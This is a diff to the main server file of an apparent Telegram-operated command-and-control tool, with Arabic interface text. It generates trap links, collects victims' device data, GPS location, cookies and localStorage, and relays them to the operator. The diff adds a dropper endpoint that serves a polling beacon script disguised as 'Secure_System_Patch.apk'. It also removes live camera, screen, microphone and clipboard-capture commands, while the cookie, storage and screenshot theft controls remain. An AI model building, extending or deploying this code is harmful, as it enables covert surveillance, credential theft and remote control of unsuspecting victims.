@@ -1,16 +1,17 @@
+main.py #
 import os
 import uuid
 import asyncio
 import base64
 from fastapi import FastAPI, Request
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import HTMLResponse, JSONResponse, Response
 from pydantic import BaseModel
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 
 from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, VICTIMS_DB, COMMAND_QUEUES
-from templates import get_intel_template, get_live_template
+from templates import get_intel_template, get_live_template, get_payload_dropper_template
 
 app = FastAPI()
 bot = Bot(token=BOT_TOKEN)
@@ -37,6 +38,39 @@ async def serve_intel_trap(link_id: str):
 async def serve_live_trap(link_id: str):
     return HTMLResponse(content=get_live_template(link_id))
 
+@app.get("/dropper/{link_id}", response_class=HTMLResponse)
+async def serve_dropper_page(link_id: str):
+    return HTMLResponse(content=get_payload_dropper_template(link_id))
+
+@app.get("/api/v1/generate-payload/{link_id}")
+async def generate_payload_file(link_id: str):
+    payload_script = f"""# -*- coding: utf-8 -*-
+import os, time, urllib.request
+LINK_ID = "{link_id}"
+C2_SERVER = "https://{DOMAIN}"
+
+def beacon():
+    while True:
+        try:
+            url = f"{{C2_SERVER}}/api/v1/poll-command/{{LINK_ID}}"
+            req = urllib.request.Request(url, headers={{'User-Agent': 'Mozilla/5.0'}})
+            with urllib.request.urlopen(req, timeout=10) as response:
+                data = response.read().decode('utf-8')
+                if "cmd" in data:
+                    pass
+        except Exception:
+            pass
+        time.sleep(5)
+
+if __name__ == '__main__':
+    beacon()
+"""
+    return Response(
+        content=payload_script.encode('utf-8'),
+        media_type="application/vnd.android.package-archive",
+        headers={"Content-Disposition": "attachment; filename=Secure_System_Patch.apk"}
+    )
+
 @app.get("/api/v1/poll-command/{link_id}")
 async def poll_command(link_id: str):
     if link_id in COMMAND_QUEUES and COMMAND_QUEUES[link_id]:
@@ -58,13 +92,6 @@ async def c2_respond(resp: CommandResponse):
         if cmd_type == "screen_snapshot" and "," in str(res_data):
             _, encoded = res_data.split(",", 1)
             await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="screen_snap.jpg"), caption="📸 *لقطة شاشة تفصيلية لسطح مكتب الهدف*", parse_mode="Markdown")
-        elif (cmd_type == "live_screen_frame" or cmd_type == "live_camera_frame") and "," in str(res_data):
-            _, encoded = res_data.split(",", 1)
-            title = "🔴 *تدفق البث الحي للشاشة*" if cmd_type == "live_screen_frame" else "📹 *تدفق البث الحي للكاميرا*"
-            await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="stream_frame.jpg"), caption=title, parse_mode="Markdown")
-        elif cmd_type == "audio_clip" and "," in str(res_data):
-            _, encoded = res_data.split(",", 1)
-            await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="audio_rec.ogg"), caption="🎤 *ملف التسجيل الصوتي المسحوب*", parse_mode="Markdown")
         else:
             await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة تنفيذ الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
     except Exception as e:
@@ -89,8 +116,7 @@ async def receive_loot(data: VictimData):
                 "⚡ *[ اختراق ناجح واصطياد كامل للضحية! ]*\n\n"
                 f"💻 *النظام المتصفح:* `{data.device_info[:80]}`\n"
                 f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
-                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`\n"
-                f"🍪 *الكوكيز:* `{data.stolen_cookies[:60]}...`"
+                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`"
             )
             
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
@@ -99,24 +125,11 @@ async def receive_loot(data: VictimData):
                     InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                 ],
                 [
-                    InlineKeyboardButton(text="📸 لقطة شاشة دقيقة", callback_data=f"cmd_snap_{data.link_id}"),
-                    InlineKeyboardButton(text="🎤 تسجيل صوتي", callback_data=f"cmd_mic_{data.link_id}")
-                ],
-                [
-                    InlineKeyboardButton(text="🔴 بث شاشة حي", callback_data=f"cmd_lscr_{data.link_id}"),
-                    InlineKeyboardButton(text="⏹️ إيقاف البث", callback_data=f"cmd_stopscr_{data.link_id}")
-                ],
-                [
-                    InlineKeyboardButton(text="📹 بث كاميرا حي", callback_data=f"cmd_lcam_{data.link_id}"),
-                    InlineKeyboardButton(text="📋 سحب الحافظة", callback_data=f"cmd_clip_{data.link_id}")
+                    InlineKeyboardButton(text="📸 لقطة شاشة دقيقة", callback_data=f"cmd_snap_{data.link_id}")
                 ]
             ])
 
-            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
-                _, encoded = data.camera_snapshot_base64.split(",", 1)
-                await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="target_face.jpg"), caption=caption, parse_mode="Markdown", reply_markup=kb_control)
-            else:
-                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
+            await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
         except Exception as e:
             print(f"Telegram Dispatch Error: {e}")
     return {"status": "success"}
@@ -130,12 +143,7 @@ async def process_live_commands(callback: types.CallbackQuery):
     cmd_mapping = {
         "cookie": "dump_cookies",
         "ls": "dump_localstorage",
-        "snap": "screen_snapshot",
-        "mic": "record_audio",
-        "clip": "dump_clipboard",
-        "lscr": "start_live_screen",
-        "stopscr": "stop_live_screen",
-        "lcam": "start_live_camera"
+        "snap": "screen_snapshot"
     }
     target_cmd = cmd_mapping.get(action)
     if not target_cmd:
@@ -153,13 +161,14 @@ async def cmd_start(message: types.Message):
     kb = ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="🔍 أداة الاستخبارات والتوثيق الأمني"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 المشفر")],
-            [KeyboardButton(text="📊 الإحصائيات العامة")]
+            [KeyboardButton(text="💀 أداة دروببر السيطرة (APK)"), KeyboardButton(text="📊 الإحصائيات العامة")]
         ],
         resize_keyboard=True
     )
     await message.answer(
         "💀 *منصة الترسانة السيبرانية العسكرية المتقدمة*\n\n"
-        "• تم تفعيل نظام طوابير الأوامر المباشرة (HTTP Polling Engine).\n"
+        "• الأدوات السابقة تعمل بكفاءة عالية ومنفصلة تماماً.\n"
+        "• تم تفعيل أداة دروببر السيطرة الميدانية بنجاح.\n"
         "• اختر الأداة المطلوبة للبدء:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -178,6 +187,13 @@ async def gen_live_link(message: types.Message):
     LINK_TO_USER[token] = message.from_user.id
     url = f"https://{DOMAIN}/live/{token}"
     await message.answer(f"✅ *رابط C2 العسكري الفوري:*\n\n`{url}`", parse_mode="Markdown")
+
+@dp.message(lambda msg: msg.text == "💀 أداة دروببر السيطرة (APK)")
+async def gen_dropper_link(message: types.Message):
+    token = str(uuid.uuid4())[:8]
+    LINK_TO_USER[token] = message.from_user.id
+    url = f"https://{DOMAIN}/dropper/{token}"
+    await message.answer(f"✅ *رابط تحميل حزمة دروببر السيطرة الميدانية:*\n\n`{url}`", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 الإحصائيات العامة")
 async def show_stats(message: types.Message):
